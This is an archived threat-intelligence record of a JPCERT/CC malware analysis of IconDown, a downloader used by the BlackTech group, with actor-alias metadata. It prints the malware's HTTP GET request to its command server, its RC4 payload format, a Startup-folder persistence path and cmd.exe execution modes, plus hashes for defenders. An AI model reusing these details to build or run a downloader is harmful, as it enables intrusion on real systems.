{
    "id": "2fc960c6-436a-4195-a22f-0b00bcd164a8",
    "created_at": "2023-01-12T15:06:15.650597Z",
    "updated_at": "2025-03-27T02:17:02.27222Z",
    "deleted_at": null,
    "sha1_hash": "1e96d812b18ed2acbadc4e097d1833c795d7f115",
    "title": "2019-11-21 - IconDown – Downloader Used by BlackTech",
    "authors": "",
    "file_creation_date": "2022-05-28T21:44:40Z",
    "file_modification_date": "2022-05-28T21:44:40Z",
    "file_size": 1678538,
    "plain_text": "# JPCERT Coordination Center official Blog\n\n**[blogs.jpcert.or.jp/en/2019/11/icondown-downloader-used-by-blacktech.html](https://blogs.jpcert.or.jp/en/2019/11/icondown-downloader-used-by-blacktech.html)**\n\n田中 [信太郎（Shintaro Tanaka）](https://blogs.jpcert.or.jp/en/s-tanaka/)\n\nNovember 21, 2019\n\n## IconDown – Downloader Used by BlackTech\n\n[BlackTech](https://blogs.jpcert.or.jp/en/tags/blacktech/)\n\n[Email](http://10.10.0.46/mailto:?subject=IconDown%20%E2%80%93%20Downloader%20Used%20by%20BlackTech&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2019%2F11%2Ficondown-downloader-used-by-blacktech.html)\n\n[In the past articles, we have introduced TSCookie and](https://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html) [PLEAD, the malware used by an](https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html)\nattack group BlackTech. We have confirmed that this group also uses another type of\nmalware called “IconDown”. According to ESET’s blog[1], it has been confirmed that the\nmalware is distributed through the update function of ASUS WebStorage. This article\ndescribes the details of IconDown found in Japanese organisations.\n\n### IconDown’s behaviour\n\nThe malware downloads a file from a specific site. This is an example of the HTTP GET\nrequests sent from IconDown.\n```\nGET /logo.png HTTP/1.1\nHost: update.panasocin.com\nCache-Control: no-cache\n\n```\nThen, it searches for the following HEX values (as a signature of the embedded data) from\nthe beginning of the downloaded file.\n```\n91 00 13 87 33 00 90 06 19\n\n```\nIf the signature value is found, the following 256-byte data is parsed as a RC4 key. It is used\nto decrypt the data embedded in the downloaded file. (See Table 1 in Appendix A for details.)\n\n\n-----\n\nFigure 1: RC4 key and encrypted data\nRC4-encrypted data is expected to contain configuration value and PE file. The following\nfigure show the decrypted data.\n\n\n-----\n\nFigure 2: Example of decrypted data\nIconDown creates a PE file from the decrypted data and save it to the filesystem. Based on\nthe configuration value, it determines the path to save the file from the following:\n\nFile name contained in the configuration of the downloaded file\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\slui.exe\n%TEMP%\\F{random 8-digit hexadecimal string}.TMP\n\nThen, the saved PE file is executed as specified in the configuration value. (See Table 3 in\nAppendix B for details of the configuration.)\n\n### In Closing\n\nBlackTech has carried our attacks against Japanese organisations by using various types of\nmalware. As the same activity is likely to continue, we will keep an eye on the situation. The\nhash values of the sample are listed in Appendix C, as well as a C&C server in Appendix D.\nPlease make sure that none of your devices is communicating to the host.\n\nShintaro Tanaka\n\n(Translated by Yukako Uchida)\n\n\n-----\n\n**Reference**\n\n[1]ESET: Plead malware distributed via MitM attacks at router level, misusing ASUS\nWebStorage\n\n[https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/](https://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/)\n\n**Appendix A: Format of data downloaded by IconDown**\n\nTable 1: Format of data downloaded by IconDown\n\n**Offset** **Length** **Contents**\n\n0x000 9 91 00 13 87 33 00 90 06 19 (HEX value)\n\n0x009 256 RC4 key\n\n0x209 - RC4-encrypted data (See Table 2 for details.)\n\nTable 2: Format of the encrypted data\n\n**Offset** **Length** **Contents**\n\n0x000 4 Fixed value (between 0 and 5, see Table 3 for details)\n\n0x010 - File name (%APPDATA%\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\slui.exe if not configured)\n\n0x114 - PE file\n\n**Appendix B: Method of creating/executing PE files**\n\nTable 3: Methods of creating/executing PE files\n\n**Value** **Contents**\n\n0x00000000 Create a file named [File name in Table 2]\n\n0x00000001 Create a file named [File name in Table 2] and execute cmd.exe /c [File\nname in Table 2]\n\n0x00000002 Terminate itself\n\n0x00000003 Create a file named [File name in Table 2] and terminate itself\n\n0x00000004 Create a file named [File name in Table 2], execute cmd.exe /c [File name\nin Table 2] and terminate itself\n\n\n-----\n\n**Value** **Contents**\n\n0x00000005 Create a file named [File name in Table 2] and %TEMP%\\F{random 8-digit\nhexadecimal string}, execute cmd.exe /c %TEMP%\\F{random 8-digit\nhexadecimal string} and terminate itself\n\n**Appendix C: Hash value of the samples**\n\nIconDown\n\n634839b452e43f28561188a476af462c301b47bddd0468dd8c4f452ae80ea0af\n6bf301b26a919f86655e4ccb20237cc3b6b6888f258d96aac4d62df7980e51a5\n2e789fc5aa1318d0286264d70b2ececa15664689efa4f47c485d84df55231ac4\n\nA sample file downloaded by IconDown\n\nf6494698448cdaf6ec0ed7b3555521e75fac5189fa3c89ba7b2ad492188005b4\n\n**Appendix D: C&C server**\n\nupdate.panasocin.com\n\n[Email](http://10.10.0.46/mailto:?subject=IconDown%20%E2%80%93%20Downloader%20Used%20by%20BlackTech&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2019%2F11%2Ficondown-downloader-used-by-blacktech.html)\n\nAuthor\n\n田中 [信太郎（Shintaro Tanaka）](https://blogs.jpcert.or.jp/en/s-tanaka/)\n\nIncident Coordinator and Malware Analyst at Incident Response Group of JPCERT/CC.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid. Thank you!\n\n## Related articles\n\n\n-----\n\nAnalysis of HUI Loader\n\nAnti-UPX Unpacking Technique\n\nFAQ: Malware that Targets Mobile Devices and How to Protect Them\n\nMalware WinDealer used by LuoYu Attack Group\n\n\n-----\n\nMalware Gh0stTimes Used by BlackTech\n\n\n[Back](https://blogs.jpcert.or.jp/en/2019/10/apcert2019.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2019/11/2019-first-regional-symposium-in-nadi-fiji.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-11-21 - IconDown – Downloader Used by BlackTech.pdf"
    ],
    "report_names": [
        "2019-11-21 - IconDown – Downloader Used by BlackTech.pdf"
    ],
    "threat_actors": [
        {
            "id": "2646f776-792a-4498-967b-ec0d3498fdf1",
            "created_at": "2022-10-25T15:50:23.475784Z",
            "updated_at": "2025-03-27T02:00:55.479958Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Palmerworm"
            ],
            "source_name": "MITRE:BlackTech",
            "tools": [
                "Kivars",
                "PsExec",
                "TSCookie",
                "Flagpro",
                "Waterbear"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d3a7123c-f519-49a0-a234-de24a1ef052a",
            "created_at": "2022-10-25T16:47:55.545211Z",
            "updated_at": "2025-03-27T02:05:17.254744Z",
            "deleted_at": null,
            "main_name": "BRONZE CANAL",
            "aliases": [
                "CTG-6177 ",
                "Circuit Panda ",
                "Palmerworm ",
                "Shrouded Crossbow ",
                "BlackTech"
            ],
            "source_name": "Secureworks:BRONZE CANAL",
            "tools": [
                " DRIGO",
                " Flagpro",
                " Gh0stTimes",
                " PLEAD",
                " Spiderpig",
                " Waterbear",
                "Bifrose"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75024aad-424b-449a-b286-352fe9226bcb",
            "created_at": "2023-01-06T13:46:38.962724Z",
            "updated_at": "2025-03-27T02:00:02.964002Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "CIRCUIT PANDA",
                "Temp.Overboard",
                "G0098",
                "Red Djinn",
                "HUAPI",
                "Palmerworm",
                "T-APT-03",
                "Manga Taurus",
                "Earth Hundun"
            ],
            "source_name": "MISPGALAXY:BlackTech",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "efa7c047-b61c-4598-96d5-e00d01dec96b",
            "created_at": "2022-10-25T16:07:23.404442Z",
            "updated_at": "2025-03-27T02:02:09.781478Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Circuit Panda",
                "Earth Hundun",
                "Manga Taurus",
                "Operation PLEAD",
                "Operation Shrouded Crossbow",
                "Operation Waterbear",
                "Palmerworm",
                "Radio Panda",
                "Red Djinn",
                "T-APT-03",
                "TEMP.Overboard"
            ],
            "source_name": "ETDA:BlackTech",
            "tools": [
                "BIFROST",
                "BUSYICE",
                "BendyBear",
                "Bluether",
                "CAPGELD",
                "DRIGO",
                "Deuterbear",
                "Flagpro",
                "GOODTIMES",
                "Gh0stTimes",
                "IconDown",
                "KIVARS",
                "LOLBAS",
                "LOLBins",
                "Linopid",
                "Living off the Land",
                "TSCookie",
                "Waterbear",
                "XBOW",
                "elf.bifrose"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535975,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1653774280,
    "ts_modification_date": 1653774280,
    "files": {
        "pdf": "https://archive.orkl.eu/1e96d812b18ed2acbadc4e097d1833c795d7f115.pdf",
        "text": "https://archive.orkl.eu/1e96d812b18ed2acbadc4e097d1833c795d7f115.txt",
        "img": "https://archive.orkl.eu/1e96d812b18ed2acbadc4e097d1833c795d7f115.jpg"
    }
}